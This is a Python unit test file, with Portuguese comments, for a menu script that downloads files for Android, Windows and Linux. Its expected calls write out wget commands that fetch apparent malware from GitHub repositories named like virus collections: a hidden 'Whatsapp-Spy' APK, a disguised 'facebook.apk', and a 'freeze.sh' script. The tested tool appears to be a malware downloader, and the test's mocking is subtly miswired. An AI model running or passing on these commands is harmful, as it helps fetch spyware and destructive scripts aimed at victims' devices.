from unittest import mock
import unittest
from meu_script import android, windows, linux, inicio

class TestAndroidDownload(unittest.TestCase):
    @mock.patch('builtins.input', side_effect=['1', '00'])
    @mock.patch('os.system', side_effect=lambda x: None)  # Para evitar chamadas reais do sistema
    def test_android_download(self, mock_input, mock_os_system):
        with mock.patch('time.sleep'):
            android()
        
        expected_calls = [
            mock.call('Selecione uma opcao:: '),
            mock.call('clear'),
            mock.call("wget https://github.com/Hacking-pch/papaviruz/raw/master/.Whatsapp-Spy.apk"),
            mock.call("mv '.Whatsapp-Spy.apk' Android/.Whatsapp-Spy.apk"),
            mock.call('Selecione uma opcao:: '),
            mock.call('clear'),
            mock.call(mock.ANY)  # Chamada para o print(logo)
        ]
        mock_input.assert_has_calls(expected_calls, any_order=False)
        mock_os_system.assert_called()
        
        pass

class TestWindowsDownload(unittest.TestCase):
    @mock.patch('builtins.input', side_effect=['2', '00'])
    @mock.patch('os.system', side_effect=lambda x: None)  # Para evitar chamadas reais do sistema
    def test_windows_download(self, mock_input, mock_os_system):
        with mock.patch('time.sleep'):
            windows()
        
        expected_calls = [
            mock.call('\nEscolha uma das opcoes abaixo: '),
            mock.call('clear'),
            mock.call("wget https://github.com/LOoLzeC/vcrt/raw/master/facebook.apk"),
            mock.call("mv 'facebook.apk' Windows/facebook.apk"),
            mock.call('\nEscolha uma das opcoes abaixo: '),
            mock.call('clear'),
            mock.call(mock.ANY)  # Chamada para o print(logo)
        ]
        mock_input.assert_has_calls(expected_calls, any_order=False)
        mock_os_system.assert_called()

pass  

class TestLinuxDownload(unittest.TestCase):
    @mock.patch('builtins.input', side_effect=['3', '00'])
    @mock.patch('os.system', side_effect=lambda x: None)  # Para evitar chamadas reais do sistema
    def test_linux_download(self, mock_input, mock_os_system):
        with mock.patch('time.sleep'):
            linux()
        
        expected_calls = [
            mock.call('\nEscolha uma das opcoes abaixo: '),
            mock.call('clear'),
            mock.call("wget https://github.com/Gameye98/V1RU5/raw/master/freeze.sh"),
            mock.call("mv 'freeze.sh' Linux/freeze.sh"),
            mock.call('\nEscolha uma das opcoes abaixo: '),
            mock.call('clear'),
            mock.call(mock.ANY)  # Chamada para o print(logo)
        ]
        mock_input.assert_has_calls(expected_calls, any_order=False)
        mock_os_system.assert_called()
pass

if __name__ == '__main__':
    unittest.main()
